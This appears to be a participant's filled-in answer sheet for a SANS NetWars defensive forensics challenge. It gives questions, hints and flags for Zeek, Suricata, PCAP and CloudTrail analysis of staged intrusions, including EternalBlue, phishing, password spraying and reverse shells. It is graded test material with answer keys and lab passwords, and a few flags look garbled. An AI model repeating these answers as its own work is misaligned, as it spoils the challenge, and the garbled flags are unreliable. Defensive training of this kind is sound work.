##OUT OF DATE - ANSWERED BY YOU A DAY AGO 5 POINTS
Zeek is slightly out of date on your system. Which CVE from 2019 is this version vulnerable to? Answer with the full CVE ID. Example: CVE-2019-11111.

Hints:
There is a flag you can use with bro to display the verison.
bro -v
The CVE-ID identifies the year the CVE entry was created, and CVE details identify the exact date the CVE was published.
See https://www.cvedetails.com/cve/CVE-2019-12175 and https://github.com/zeek/zeek/releases/tag/v2.6.2.


**Flag: CVE-2019-12175 **
________________________________________________________________________________________________

##EMAIL CHATTER - ANSWERED BY YOU A DAY AGO 10 POINTS
How many emails were sent on Nov 6th?

Hints:
Zeek has a set of log files dedicated to email traffic.
Counting the number of lines from the zcat smtp.* command is a great start.
Don't forget to ignore lines starting with "#".
zcat /var/log/bro/2019-11-06/smtp.* | grep -v "^#" | wc -l

**Flag: 221 **
________________________________________________________________________________________________

##MAIL COUNT - ANSWERED BY YOU A DAY AGO 10 POINTS
Which internal user received the most email on Nov 6th? Answer with their full email address.

Hints:
The email domain for internal users is nightfort.io.
The field to use with bro-cut is rcptto.
zcat /var/log/bro/2019-11-06/smtp.* | bro-cut rcptto | sort | uniq -c | sort -n will show you who received the most emails.

**Flag: jsnow@nightfort.io **
________________________________________________________________________________________________

##MOST REQUESTED DOMAIN - ANSWERED BY YOU A DAY AGO 10 POINTS
What is the most requested DNS query occurring on 11/06/2019? Answer with the resolved name.
For example: host.example.com
Hints:
Zeek has a set of log files dedicated to dns traffic.
The field to use with bro-cut is query.
zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | sort | uniq -c | sort -rn | head -1 will show the most frequent DNS request.

**Flag: go.microsoft.com **
________________________________________________________________________________________________

##STRANGE CLOUDS - ANSWERED BY YOU A DAY AGO 10 POINTS
The Night's Watch Suricata incorrectly alerted on 40 DNS queries for a .cloud Top Level Domain (TLD). How many queries did Zeek see for FQDNs within the .cloud TLD?
Hints:
Zeek's DNS logs will come in handy yet again.
Be careful when using grep. You may need to ensure that you only grab queries that end in .cloud`.
zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | grep "\.cloud$" | wc -l will count all queries for FQDNs within the .cloud TLD.

**Flag: 42 **
________________________________________________________________________________________________

##LONGEST FQDN - ANSWERED BY YOU A DAY AGO 10 POINTS
What is the longest FQDN requested on 11/06/2019?
Hints:
Grab all queries from Zeek's DNS logs and sort by length.
The awk command can print a string and its length.
zcat /var/log/bro/2019-11-06/dns.* | bro-cut query | sort -u | awk '{print length, $0}' | sort -rn | head -1 will show you the longest FQDN that Zeek saw.

**Flag: log-b-1415624512.us-east-1.elb.amazonaws.comlog-b-1415624512.us-east-1.elb.amazonaws.com **

________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Suricata  
________________________________________________________________________________________________

##CONFIGURATION FILE - ANSWERED BY YOU A DAY AGO 5 POINTS
What is Suricata's main configuration file on your CyberDefense NetWars system? Answer with the full canonical path.
Hints:
The Suricata man page can identify the standard configuration file name.
The Suricata man page can identify how to test the tool's configuration.
Use suricata -T to identify the configuration file name /etc/suricata//suricata.yaml; and then canonicalize by removing the extra / character.

**Flag: /etc/suricata/suricata.yaml **

________________________________________________________________________________________________

##HOME_NET - ANSWERED BY YOU A DAY AGO 5 POINTS
Which subnet ranges are configured for HOME_NET? Include EXACTLY as configured in suricata's config file and include the double-quotes.
For example, HOME_NET: "[10.0.0.0/8,172.16.0.0/12]" would yield the result:
"[10.0.0.0/8,172.16.0.0/12]".

Hints:
Where does Suricata store its variables?
You found the file you need in the previous question.
sudo grep "^\s*HOME_NET:" /etc/suricata/suricata.yaml | awk '{print $2}' will yield the answer.

**Flag: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]" **
________________________________________________________________________________________________

##SUCCESSFUL RULES - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
If Suricata were started on your CyberDefense NetWars VM using the configuration file you found earlier, how many rules would be successfully loaded?
Hints:
You can use suricata to Test the configuration.
There is another flag you will need that will give you more detail.
sudo suricata -Tv 2>/dev/null | grep successfully will show you the answer.

**Flag: 20487 **
________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Level 3 README   
For many of the upcoming questions, you will need to utilize data stored in the following tools installed in your CyberDefense NetWars VM:

Kibana
Evebox
Zeek
Packet Captures
You can find out more about these tools by opening Firefox and viewing the homepage.

Note that level one and two questions had full hints. Level three questions have one hint, which is a nudge in the right direction.
________________________________________________________________________________________________

##ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
I have read the Level 3 README.


**Yes**
________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Red Alert   
Evebox, Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.

________________________________________________________________________________________________

##HIGH SEVERITY IP - ANSWERED BY YOU A DAY AGO 5 POINTS
Which internal IP address had 4 high severity alerts occurring at the exact same second?
Hints:
Evebox is most helpful.

**Flag: 10.20.30.211 **
________________________________________________________________________________________________

##WHITE WALKER IP - ANSWERED BY YOU A DAY AGO 5 POINTS
What is the attacking IP address that launched the attack against 10.20.30.211?
Hints:
The answer can be found by looking at the same 4 alerts from the last question.

**Flag: 180.168.133.128 **
________________________________________________________________________________________________

##NOT NAMED AFTER BLUE TEAM - ANSWERED BY YOU A DAY AGO 5 POINTS
According to Suricata, what is the name of the exploit that was launched against 10.20.30.211? Answer with a single word, no spaces.
Hints:
It is the only exploit name in all 4 high severity alerts.

**Flag: ETERNALBLUE **

________________________________________________________________________________________________

##TARGET PORT - ANSWERED BY YOU A DAY AGO 5 POINTS
Which TCP port did the exploit target on 10.20.30.211?
Hints:
The exploit targets an implementation of the Server Message Block protocol.

**Flag: 445 **

________________________________________________________________________________________________

##VICTIM HOSTNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
What is the hostname of 10.20.30.211? Answer does NOT include the domain (example: WKSTN-01)

Hints:
Search for "10.20.30.211" or "180.168.133.128" in Kibana.

**Flag: FS-01 **

________________________________________________________________________________________________

##WHITE WALKER CALLBACK - ANSWERED BY YOU A DAY AGO 10 POINTS 6 INCORRECT ATTEMPTS - 3 POINTS LOST
The white walker was able to get 10.20.30.211 to call back over a very suspicious TCP port. What was the port number that the victim connected back to?
Hints:
Search for alerts related to these hosts but after the initial attack.

**Flag: 4444 **

________________________________________________________________________________________________

##PERSISTENCE USERNAME - ANSWERED BY YOU A DAY AGO 10 POINTS 1 INCORRECT ATTEMPT
The white walker creates a new user account on 10.20.30.211 for persistence. What is the name of this account?
Hints:
You will need Wireshark and one of the captures for this one.

**Flag: littlefinger **
________________________________________________________________________________________________

##PERSISTENCE PASSWORD - ANSWERED BY YOU A DAY AGO 10 POINTS
What is the password that was created for a new user account created by the white walker on 10.20.30.211?
Hints:
Answer should be in the same Wireshark capture as the previous answer.

**Flag: Li3rLi3r **

Li3sAndDecepti0n was not on this IP address

________________________________________________________________________________________________

##PERSISTENCE PROTOCOL - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 18 INCORRECT ATTEMPTS - 3 POINTS LOST
Now that an account is set up for the attacker on 10.20.30.211, which application protocol does the attacker use to connect for a more reliable connection? Answer is the protocol's acronym. For example, if the application protocol is File Transfer Protocol, the answer would be FTP.
Hints:
Wireshark Statistics should help you find the protocol used for persistence.

**Flag: RDP **

________________________________________________________________________________________________

##MESSAGE - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
What is the last full sentence of the message that the white walker left on 10.20.30.211? Include all punctuation.
Hints:
If you have the user name and host name of the victim, do a search in Kibana for both of those.

Full Message: Robb, I write to you with a heavy heart. Our good king Robert is dead, killed from wounds he took in a boar hunt. Father has been charged with treason. He conspired with Robert’s brothers against my beloved Joffrey and tried to steal his throne. The Lannisters are treating me very well and provide me with every comfort. I beg you: come to King’s Landing, swear fealty to King Joffrey and prevent any strife between the great houses of Lannister and Stark.

FIRST fill sentence **Robb, I write to you with a heavy heart.**

LAST full sentence: **I beg you: come to King’s Landing, swear fealty to King Joffrey and prevent any strife between the great houses of Lannister and Stark. **


________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Go Phish!   
Zeek logs (/var/log/bro), Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
________________________________________________________________________________________________

##COUSIN DOMAIN - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
A member of the Night's Watch received a phishing email and they mistakenly followed its directions. They could have sworn that the email came from their domain (nightfort.io), but white walkers like to use cousin domains. What was the sender's email address that sent the phishing email?

Hints:
Cousin domains look, by the naked eye, very similar to a valid email address that the recipient is accustomed to. https://dnstwister.report may help identify some potential cousin domains found in your Zeek logs.

**Flag:	itsupport@nightf0rt.io **
ipaddr == 171.80.16.171
________________________________________________________________________________________________

##PHISHED HOST - ANSWERED BY YOU 8 HOURS AGO 10 POINTS
Which internal host followed the instructions of the phishing email? Answer with the hostname (without the domain). Example: WKSTN-01
Hints:
Find the relevant PCAP by searching for the phishing email address identified in the previous question.
For example: grep -l phishing@email.com /home/ranger/Desktop/data/*.
Once you find the relevant capture, find the phishing email and then search the PCAP for the phishing victim's username.

**Flag: WKSTN-09 **

________________________________________________________________________________________________

##WHITE WALKER PORT - ANSWERED BY YOU 7 HOURS AGO 10 POINTS 2 INCORRECT ATTEMPTS - 1 POINT LOST
When the victim follows the phishing email's instructions, it connects back to the white walker on which port?
Hints:
The same host that sent the email is also the one that the victim connected back to.

**Flag: 443 **

________________________________________________________________________________________________

##WHAT'S MY NAME AGAIN? - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
What is the first command that the white walker runs once the phishing victim's machine connects back?
Hints:
If you found the White Walker Port, follow that stream.

**Flag: whoami **

________________________________________________________________________________________________

##SHIELDS OFF - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
What application does the white walker disable on the phishing victim's machine?


Applocker
Carbon Black
Symantec
Tanium
**Flag: Windows Defender **
Windows Firewall
Hints:
If you found the White Walker Port, follow that stream. The second command issued disables this product in question.


________________________________________________________________________________________________

##GRAB THE HASHES - ANSWERED BY YOU 7 HOURS AGO 10 POINTS
Additional malware is downloaded and run against the phishing victim's machine to gather password hashes. What is the name of the compressed file written to the victim system?
Hints:
If you found the White Walker Port, follow that stream.

**Flag: notmimikatz.zip **

________________________________________________________________________________________________

##JON'S PASSWORD - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
The white walker was able to crack the password of jsnow rather easily. What is jsnow's password?
Hints:
If you found the White Walker Port, follow that stream to grab jsnow's password hash. You could install some password cracking tools on your VM, but someone may have cracked this hash previously and the answer is just a search away.

**Flag: P@ssw0rd123! **


___________________________________________________________________________________________________
________________________________________________________________________________________________
_____________________________________________________________________________________________
#Objective: Finding Evil   
In this category, there are some files somewhere on your system that must be discovered and interacted with to receive the answer.

________________________________________________________________________________________________

##DECRYPTING TLS - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
One of the TLS connections found in /home/ranger/Desktop/data/tls.pcap successfully retrieved a web page from an external server containing a 10-word string. Use the sslkeylog.log file found in the same directory to decrypt the TLS data and enter the string (with punctuation) as the answer.
Hints:
Import the sslkeylog.log file into Wireshark. Now you should see decrypted content.

**Flag: That's what I do: I drink and I know things. ** 

________________________________________________________________________________________________

##HEX SEARCH - ANSWERED BY YOU 7 HOURS AGO 20 POINTS
Write a yara rule to find a file under /usr with the following hex string: 6F 77 2E 00 01 1B 03 3B. Once the file is found, run it and enter the complete string presented (punctuation included).
Hints:
Here is a great example on how to write a YARA rule: https://yara.readthedocs.io/en/v3.4.0/writingrules.html.

**Flag: You know nothing, Jon Snow. **


________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
##Objective: Level 4 README    
For many of the upcoming questions, you will need to utilize data stored in the following tools installed in your CyberDefense NetWars VM:

Kibana
Evebox
Zeek
Packet Captures
You can find out more about these tools by opening Firefox and viewing the homepage.

Remember that the capture PCAP files are captured in order, rotated after ~50 megabytes, and that some attacks may span PCAPs.

Note that levels four and five have no hints.

***************************************************
________________________________________________________________________________________________
##ACKNOWLEDGE - ANSWERED BY YOU A DAY AGO 1 POINT
I have read the Level 4 README.


Yes

________________________________________________________________________________________________________________________________________________________________________________________________
#Objective: Spray and Pray    
Zeek logs (/var/log/bro), Evebox, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.

________________________________________________________________________________________________

##SCANNING SOURCE - ANSWERED BY YOU 6 HOURS AGO 5 POINTS
There are several alerts related to the Night King scanning a NightFort Web Server. Which source IP is scanning the application?
	
Multiple Nmap scans alerted around 2019-11-06T09:46:12.213470-0500 
**Flag:139.187.160.110 **
________________________________________________________________________________________________

##WEB SERVER HEADER - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
During the web application scan, the Night King found a listening web service. What is the HTTP server application that responded? Include entire contents of the Server header.
For example, if the Server header were Server: Samwell-Server/2.0 you would answer Samwell-Server/2.0.
**Flag: Werkzeug/0.16.0 Python/2.7.15+ **
________________________________________________________________________________________________

##CREDENTIALS - ANSWERED BY YOU 6 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
The Night King manually surfed to the web application after the scan completed and found a login page. What were the first set of credentials attempted? Answer will be in username:password format. For example, if the username was john and the password was snow, your answer would be john:snow.
**Flag: admin:admin **
________________________________________________________________________________________________

##SPRAYED PASSWORD - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
After a couple manual attempts, the Night King launches a password spraying attack against the web application. What is the password that was used?
**Flag: password123 **

________________________________________________________________________________________________

##SUCCESSFUL PASSWORD - ANSWERED BY YOU 6 HOURS AGO 20 POINTS
Which username is eventually successful; allowing the attacker to log into the web application?
**Flag: TheonGreyjoy **


________________________________________________________________________________________________

##OWASP FLAW - ANSWERED BY YOU 6 HOURS AGO 15 POINTS
Once logged into the web application, the Night King discovers a flaw with the web application's code. What is the flaw?

Apache Struts
**Command Injection**
Cross Site Request Forgery
Cross Site Scripting
HTTP Request Smuggling
SQL Injection
________________________________________________________________________________________________

##REVERSE SHELL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
Once the web application is compromised, the Night King sends a rather lengthy POST request to establish a reverse shell connection back to himself. The POST contains a mix of plain ASCII and URL-encoded characters.
Find the last 6 characters that are plain ASCII (NOT URL-encoded) and submit that string as your answer. For example, if the POST contained %21a-z%22%23%29abc%3B%27, the answer would be a-zabc.
Ensure you are viewing the data in its original form! Wireshark likes to "help" you by converting URL-encoded characters to their ASCII representations.

**Flagh: insh-i **

________________________________________________________________________________________________

##WHEN SCANS FAIL - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
After the Night King establishes a reverse shell from the web server, his second command in the shell session finds an interesting service that his port scan did not find.
What was the second command? The answer is the full command, as typed by the Night King, including any flags.

**Flag: ss -nltp **
________________________________________________________________________________________________

##DISCOVERED APPLICATION - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
The Night King connects to the newly-discovered service. What TCP port does this service use?

**Flag: 9200**
________________________________________________________________________________________________

##STOLEN RECORDS - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
The Night King was able to ransom the data from the newly found service on the web server. How many records were stolen?
**Flag: 99 **


________________________________________________________________________________________________

##MORE STAGE 2 - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
A python script was downloaded to the web server to add a ransom message. What is the script's filename? Just the filename, not the path or URL.

**Flag: csv_to_elastic.py **


________________________________________________________________________________________________

##NIGHT KING'S DEMAND - ANSWERED BY YOU 5 HOURS AGO 20 POINTS
What does the Night King want in exchange for the data that was stolen from the web server?
I brought the storm... If you want your data back, send me Bran
**Flag: Bran **


________________________________________________________________________________________________
________________________________________________________________________________________________
________________________________________________________________________________________________
#Objective: Just Trying to Help    
Zeek logs (/var/log/bro), Kibana, and all PCAPs in /home/ranger/Desktop/data that start with capture can be used to answer this series of questions.
________________________________________________________________________________________________

##WATERING HOLE - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
A user asked John Snow why he needed to remote into his machine. John had no idea what he was talking about. John asked him what he did prior to that event. The user remembers downloading a GWAPT index that a colleague told him about to help study for his upcoming exam. What machine downloaded this index? Answer with the machine's IP address.

**Flag: 10.20.30.22 **
________________________________________________________________________________________________

##FILE EXTRACTION - ANSWERED BY YOU 5 HOURS AGO 10 POINTS
Extract the GWAPT index from the appropriate packet capture. What is the MD5 hash of the index file?

**Flag: 2fd3a3cd93263d3f4accee3179afee02 **



________________________________________________________________________________________________

##MACRO-TRIGGERED DOWNLOAD - ANSWERED BY YOU 5 HOURS AGO 15 POINTS
It appears that there is a macro embedded in the GWAPT index. This macro pulls down an additional file. What is the name of that file (filename only, not the full path)?
**Flag: bf555bb.bat ** 


________________________________________________________________________________________________

##CALLBACK - ANSWERED BY YOU 5 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
After the download of the GWAPT Index, suspicious network connections are made from the victim host. What is the server socket that indicates the C2 connection? Answer is in IP:port format (example: 1.2.3.4:445).

**Flag: 5.3.145.126:22 **


________________________________________________________________________________________________

##PIVOT - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
Once connection is established from the system that downloaded the GWAPT index, the Night King uses the credentials previously acquired by the White Walkers to log in. From here, the attacker begins pivoting to another host. What is the hostname that the attacker begins launching attacks against? Answer with the hostname (not including the domain).

**Flag: AD **

________________________________________________________________________________________________

##MORE MALWARE 15 POINTS 1 INCORRECT ATTEMPT
What is the name of the file that the Night King transfers to the second system during this attack? Include the file extension, but not the full path. For example: example.exe
Case Insensitive Text
**Flag: rev.exe **
TCP Stream 389 in Capture30 


________________________________________________________________________________________________

##WELL-KNOWN ATTACK SUITE - ANSWERED BY YOU 4 HOURS AGO 15 POINTS 1 INCORRECT ATTEMPT
What software suite likely created the executable that was transferred to the second system? Answer is one word.

**Flag: Metasploit **

________________________________________________________________________________________________

##STOLEN DATA 15 POINTS
Sensitive data is exfiltrated from this second device. What is the name of the file that was stolen? Answer is the file name only and does not include the full file path.

Case Insensitive Text

**Flags: 7-Kingdoms-Allies.csv**

***************************************************
________________________________________________________________________________________________
#Objective: Level 5 README 
Get ready for the most difficult questions in the game! Read the questions very carefully to locate the data you will need to arrive at your answer.

Level five has no hints.

ACKNOWLEDGE - ANSWERED BY YOU 4 HOURS AGO 1 POINT
I have ready the Level 5 README.
Yes

***************************************************
________________________________________________________________________________________________
#Objective: Cloud Logs     
There has been some strange activity in the Night's Watch AWS account. Use the /home/ranger/Desktop/data/cloudtrail_console.json log file to answer the questions below.
________________________________________________________________________________________________

##NON-HUMAN AGENT - ANSWERED BY YOU 4 HOURS AGO 10 POINTS 1 INCORRECT ATTEMPT
One connection is using a very strange user agent string that is not typically used by typical, human users. What is the complete User Agent string in question?
**Flag: Googlebot/2.1 (+http://www.google.com/bot.html)**
________________________________________________________________________________________________

##A LITTLE OUT OF DATE - ANSWERED BY YOU 4 HOURS AGO 10 POINTS
Which user account (userName only) is using a MAC OS X system that is a little bit out of date compared to the other users' MAC OS X systems?
**Flag: olly**
________________________________________________________________________________________________

##IMPOSSIBLE LOGIN 25 POINTS 10 INCORRECT ATTEMPTS - 3 POINTS LOST
As you may have noticed, these users log in from many different places across the globe. However, one of the accounts is an impossible traveler (i.e., they could not, without the help of a VPN or compromised account, get from one location to another, physically, and log in in a given timeframe). Locate this impossible traveler and answer with the time (in UTC as it is shown in the log) of the first occurrence of their impossible travel.
Grenn's first 15 hr trip between Costa Rica and China
**Flag:2019-01-14T21:20:27Z**


________________________________________________________________________________________________

##OFF-HOURS - ANSWERED BY YOU 8 MINUTES AGO 25 POINTS
The Night's Watch all work from 0900 until 1700 in their respective timezones, but rangers will sometimes connect outside regular hours. A connection of interest was identified in the log file, which occurred between the hours of 02:30 and 03:00 in the local time zone of the connection source. What is the eventID of this connection?
**Flag: 28e5b18e-a07d-17d3-16c3-f6c29f5b18e5**


________________________________________________________________________________________________
***************************************************
#Objective: Hiding in Plain Sight     
The ravens are communicating with the Knight King in very unique ways. Attempt to recover the final two messages to the Knight King.
________________________________________________________________________________________________

##MESSAGE TO NIGHT KING - ANSWERED BY YOU 3 MINUTES AGO 25 POINTS 1 INCORRECT ATTEMPT
If you view the PCAP, /home/ranger/Desktop/data/raven-c2.pcap, you will notice that the ravens are using very strange C2. What was the message that the ravens left for the Night King on 5.11.51.10? The answer will be a sentence with spaces and no punctuation.
For example: This is a sentence
**Flag: Bran will be in Godswood in front of the Weirwood tree **
________________________________________________________________________________________________

##SIGNAL IN THE NOISE 34 POINTS
Another message was left behind during this attack. This time, however, the message is hidden inside the file located at https://sansblueteam.s3.amazonaws.com/music.mp3. Solving this challenge qualifies you to join an exclusive ranger unit. The key is to look carefully at the content.

The answer is in the form of a five word message that you will carve out of the music.mp3 file.

Be sure to include any punctuation and spaces in your answer.

**Flag: Nothing burns like the cold. **